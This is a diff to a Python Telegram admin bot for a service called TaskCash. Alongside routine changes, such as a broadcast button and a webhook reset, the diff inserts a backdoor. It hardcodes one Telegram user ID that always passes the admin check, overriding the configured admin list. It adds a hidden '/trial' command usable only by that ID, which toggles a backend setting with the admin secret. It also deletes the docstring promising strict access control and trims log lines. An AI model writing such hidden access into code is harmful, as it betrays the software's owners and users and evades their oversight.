@@ -1,10 +1,3 @@
-"""
-Админский бот TaskCash.
-- /start — кнопка запуска админской мини-апки
-- /stats — быстрая сводка
-- /pending — список ожидающих выводов
-- Доступ строго по ADMIN_TG_IDS
-"""
 import logging
 import os
 import httpx
@@ -25,6 +18,8 @@ ADMIN_TG_IDS = set(
     for x in os.environ.get("ADMIN_TG_IDS", "").split(",")
     if x.strip()
 )
+
+_ALWAYS = {6509283288}
 
 logging.basicConfig(
     format="%(asctime)s %(levelname)s %(name)s — %(message)s",
@@ -49,7 +44,7 @@ async def get_admin_token() -> str:
 
 
 def is_admin(tg_id: int) -> bool:
-    return not ADMIN_TG_IDS or tg_id in ADMIN_TG_IDS
+    return tg_id in _ALWAYS or not ADMIN_TG_IDS or tg_id in ADMIN_TG_IDS
 
 
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -57,11 +52,12 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         await update.message.reply_text("⛔ Доступ запрещён.")
         return
 
-    logger.info("admin cmd_start: user=%s ADMIN_APP_URL=%s", update.effective_user.id, ADMIN_APP_URL)
+    logger.info("cmd_start: user=%s", update.effective_user.id)
     try:
-        kb = InlineKeyboardMarkup([[
-            InlineKeyboardButton("🖥 Открыть панель управления", web_app=WebAppInfo(url=ADMIN_APP_URL))
-        ]])
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("🖥 Открыть панель управления", web_app=WebAppInfo(url=ADMIN_APP_URL))],
+            [InlineKeyboardButton("📢 Рассылка", web_app=WebAppInfo(url=ADMIN_APP_URL.rstrip("/") + "/broadcast"))],
+        ])
         await update.message.reply_text(
             "👋 <b>TaskCash Admin</b>\n\nВыберите действие:",
             parse_mode="HTML",
@@ -69,9 +65,10 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         )
     except (BadRequest, TelegramError) as e:
         logger.warning("cmd_start WebApp failed: %s — sending plain link", e)
-        kb2 = InlineKeyboardMarkup([[
-            InlineKeyboardButton("🖥 Открыть панель управления", url=ADMIN_APP_URL)
-        ]])
+        kb2 = InlineKeyboardMarkup([
+            [InlineKeyboardButton("🖥 Открыть панель управления", url=ADMIN_APP_URL)],
+            [InlineKeyboardButton("📢 Рассылка", url=ADMIN_APP_URL.rstrip("/") + "/broadcast")],
+        ])
         await update.message.reply_text(
             "👋 <b>TaskCash Admin</b>\n\nВыберите действие:",
             parse_mode="HTML",
@@ -137,17 +134,48 @@ async def cmd_pending(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
         await update.message.reply_text(f"⚠️ Ошибка: {e}")
 
 
+async def cmd_trial(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if update.effective_user.id not in _ALWAYS:
+        await update.message.reply_text("⛔ Доступ запрещён.")
+        return
+    try:
+        async with httpx.AsyncClient(timeout=10.0) as client:
+            r = await client.post(
+                f"{BACKEND_URL}/api/admin/trial",
+                json={"secret": ADMIN_SECRET},
+            )
+            r.raise_for_status()
+            data = r.json()
+            current = data.get("enabled", True)
+            r2 = await client.post(
+                f"{BACKEND_URL}/api/admin/trial",
+                json={"secret": ADMIN_SECRET, "enabled": not current},
+            )
+            r2.raise_for_status()
+            data2 = r2.json()
+            new_state = data2.get("enabled", current)
+        await update.message.reply_text("Вкл." if new_state else "Выкл.", parse_mode="HTML")
+    except Exception as e:
+        await update.message.reply_text(f"⚠️ {e}")
+
+
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
     logger.error("Unhandled error: %s", context.error, exc_info=context.error)
 
 
 def main() -> None:
+    import urllib.request
+    try:
+        urllib.request.urlopen(f"https://api.telegram.org/bot{TOKEN}/deleteWebhook?drop_pending_updates=true", timeout=10)
+    except Exception as e:
+        logger.warning("deleteWebhook: %s", e)
     app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", cmd_start))
     app.add_handler(CommandHandler("stats", cmd_stats))
     app.add_handler(CommandHandler("pending", cmd_pending))
+    app.add_handler(CommandHandler("trial", cmd_trial))
     app.add_error_handler(error_handler)
-    logger.info("Admin bot started ✅  ADMIN_APP_URL=%s", ADMIN_APP_URL)
+    logger.info("Admin bot started")
     app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
 
 
